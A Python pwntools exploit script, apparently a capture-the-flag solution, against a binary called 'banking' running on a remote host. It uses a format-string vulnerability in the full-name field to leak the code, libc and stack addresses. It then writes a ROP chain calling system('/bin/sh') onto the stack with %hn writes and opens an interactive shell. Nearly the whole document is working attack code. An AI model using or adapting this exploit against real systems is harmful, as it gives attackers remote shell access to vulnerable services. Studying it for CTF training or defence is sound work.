#!/usr/bin/env python3


#KCSBank
from pwn import *

exe = ELF("./banking_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe




if args.LOCAL:
	r = process([exe.path])
else:
    r = remote("103.163.24.78", 10002)



def my_divide(system_address):
	result = []

	temp = []
	temp.append(system_address & 0xffff)
	temp.append(0)
	result.append(temp)

	temp = []
	system_address = system_address >> 16
	temp.append(system_address & 0xffff)
	temp.append(2)
	result.append(temp)

	temp = []
	system_address = system_address >> 16
	temp.append(system_address & 0xffff)
	temp.append(4)
	result.append(temp)

	return sorted(result, key=lambda x: x[0])



def main():
	#Password luu o stack, dung 0x14 (%20$hn) de overwrite return address


	# Stage 1: Leak code base, offset = 0x17d6
    

    
		user = b"abcdefgh"
		password = b"01234567"

		input()
		r.sendlineafter(b'>', b'2')
		r.sendlineafter(b'username:', user)
		r.sendlineafter(b'password:', password)
		r.sendlineafter(b'full name:', b'%7$p')
		r.sendlineafter(b'>', b'1')
		r.sendlineafter(b'Username:', user)
		r.sendlineafter(b'Password:', password)
		r.sendlineafter(b'>', b'3')

		leak_addr = int(r.recvline()[:-1], 16)
		exe.address = leak_addr - 0x17d6
		print("leak: ", hex(leak_addr))
		print("code base: ", hex(exe.address))



		#Stage 2: Leak libc addr, offset = 0x55b32
		r.sendlineafter(b'>', b'4')
		r.sendlineafter(b'feedback:', b'nothing')


		r.sendlineafter(b'>', b'2')
		r.sendlineafter(b'username:', user)
		r.sendlineafter(b'password:', password)
		r.sendlineafter(b'full name:', b'%11$p')
		r.sendlineafter(b'>', b'1')
		r.sendlineafter(b'Username:', user)
		r.sendlineafter(b'Password:', password)
		r.sendlineafter(b'>', b'3')

		leak_addr = int(r.recvline()[:-1], 16)
		libc.address = leak_addr - 0x55b32
		print("leak: ", hex(leak_addr))
		print("libc base: ", hex(libc.address))


		#Stage 3: Leak stack
		r.sendlineafter(b'>', b'4')
		r.sendlineafter(b'feedback:', b'nothing')


		r.sendlineafter(b'>', b'2')
		r.sendlineafter(b'username:', user)
		r.sendlineafter(b'password:', password)
		r.sendlineafter(b'full name:', b'%6$p')
		r.sendlineafter(b'>', b'1')
		r.sendlineafter(b'Username:', user)
		r.sendlineafter(b'Password:', password)
		r.sendlineafter(b'>', b'3')

		leak_stack = int(r.recvline()[:-1], 16)


		print("leak stack: ", hex(leak_stack))

		
		#Stage 4: write arbitrary using format string
		pop_rdi = exe.address + 0x0000000000001913
		ret = exe.address + 0x101a
		binsh = libc.address + 0x1b51d2
		system = libc.sym['system']

		full_payload = []
		full_payload.append(pop_rdi)
		full_payload.append(binsh)
		full_payload.append(ret)
		full_payload.append(system)


		target_address = leak_stack+0x28


		for i in range(4):

			result = my_divide(full_payload[i])

			payload = f'%{result[0][0]}c%20$hn'.encode()
			payload += f'%{result[1][0]-result[0][0]}c%21$hn'.encode()
			payload += f'%{result[2][0]-result[1][0]}c%22$hn'.encode()
			#payload = payload.ljust(64, b"A")
			password_payload = p64(target_address+result[0][1])
			password_payload += p64(target_address+result[1][1])
			password_payload += p64(target_address+result[2][1])


			r.sendlineafter(b'>', b'4')
			r.sendlineafter(b'feedback:', b'nothing')

			r.sendlineafter(b'>', b'2')
			r.sendlineafter(b'username:', user)
			r.sendlineafter(b'password:', password_payload)
			r.sendlineafter(b'full name:', payload)

			r.sendlineafter(b'>', b'1')
			r.sendlineafter(b'Username:', user)
			r.sendlineafter(b'Password:', password_payload)
			r.sendlineafter(b'>', b'3')

			target_address += 0x8


		r.sendlineafter(b'>', b'4')
		r.sendlineafter(b'feedback:', b'nothing')
		r.sendlineafter(b'>', b'3')






		#payload = 
		# good luck pwning :)

		r.interactive()


if __name__ == "__main__":
    main()
